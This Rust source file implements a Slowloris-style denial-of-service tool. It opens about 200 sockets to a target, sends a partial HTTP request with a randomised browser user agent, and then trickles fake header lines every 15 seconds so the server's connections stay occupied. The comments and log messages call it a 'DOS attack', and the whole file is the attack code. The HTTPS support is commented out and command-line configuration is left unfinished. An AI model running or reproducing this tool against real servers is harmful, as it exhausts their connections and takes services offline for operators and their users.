extern crate pretty_env_logger;
#[macro_use] extern crate log;

use std::env;
use rayon::prelude::*;
use std::error::Error;
use openssl::ssl::{SslStream, SslMethod, SslConnector};
use std::{thread, time};
use std::io::{Read, Write};
use std::net::{Ipv4Addr, SocketAddr, TcpStream};
use rand::prelude::*;

// /// Verbosity level
// static LOG_LEVEL: u8 = 0;

const USER_AGENTS: &[&'static str]  = &[
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    &"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    &"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ];

/// Config of the DOS attack
struct Config {
    /// https toggle
    https: bool,
    /// Target Address
    addr: SocketAddr,
    /// Use random User agents or not
    rand_ua: bool,
    socket_count: usize,
}

fn main() -> Result<(), Box<dyn Error>> {
    //Set the `RUST_LOG` var if none is provided
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "lori=INFO");
    }

    pretty_env_logger::init_timed();

    // TODO Create config from CLI arguments using Clap
    let config = Config {
        https: true,
        addr: SocketAddr::from((Ipv4Addr::new(0,0,0,0), 8000)),
        rand_ua: true,
        socket_count: 200
    };

    // Pre-Allocate socket_list
    let mut sock_list: Vec<TcpStream>  = Vec::with_capacity(config.socket_count);

    let mut rng = rand::thread_rng();

    info!("Creating Initial Sockets");

    // Create inital scokets
    for i in 0..config.socket_count {
        debug!("Creating Socket #{}", i);

        // Create socket
        let sock = init_socket(&config)?;

        // Add to list
        sock_list.push(sock);
    }


    // Start dos
    info!("Starting DOS attack on {:?}", config.addr);
    loop {
       info!("Sending keep-alive headers... Socket Count: {}", sock_list.len());


        let max = sock_list.len() - 1;

        for i in 0..max{
            // prevent out of bounds error
            if i >= sock_list.len() {
                break;
            }

            // Get socket reference
            let mut s = sock_list.get(i).unwrap();

            // Generate number again
            let y: u16 = rng.gen();

            // Write to stream
            let result = s.write_all(format!("X-a: {}\r\n", y).as_bytes());
            let result = s.write_all(" ".as_bytes());

            // Remove if socket fails
            if result.is_err(){
                warn!("Socket Error, removing...");
                sock_list.remove(i);
            }

        }

        trace!("Sockets: {}", sock_list.len());

        for _ in 0..(config.socket_count - sock_list.len()) {
            debug!("Recreating Socket...");
            let sock = init_socket(&config)?;

            sock_list.push(sock);
        }
        

        let delay = time::Duration::from_secs(15);

        thread::sleep(delay);

    }

    Ok(())
}

fn init_socket(config: &Config) -> Result<TcpStream, Box<dyn Error>>{
    // Create stream as normal
    let mut stream: TcpStream = TcpStream::connect(&config.addr)?;

    let mut rng = rand::thread_rng();

    // if stream.is_ok(){
    //     log("Connected to target!", 2);
    // } else {
    //     log("Couldn't connect to target...", 1);
    // };

    // stream = stream.unwrap();

    // Use https
    // if config.https {
    //     // Create SSL Connector
    //     let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();


    //     stream = Stream::Ssl(connector.connect("google.com", stream)?);
    // }

    let ua: &'static str;

    if config.rand_ua {
        ua = rng.choose(USER_AGENTS).unwrap();
    }
    else {
        ua = USER_AGENTS[0];
    }

    let mut rng = rand::thread_rng();

    let y: u16 = rng.gen();

    let headers = format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua);
    // let headers = format!("GET /?{} HTTP/1.1\r\n", y);

    trace!("Headers:\n{}", headers);

    // Send HTTP(S) request
    stream.write_all(headers.as_bytes())?;


    Ok(stream)
}


// /// Logs a function at given level
// fn log(log: &str, level: u8){
//     if LOG_LEVEL >= level {
//         println!("{}", log);
//     }

// }
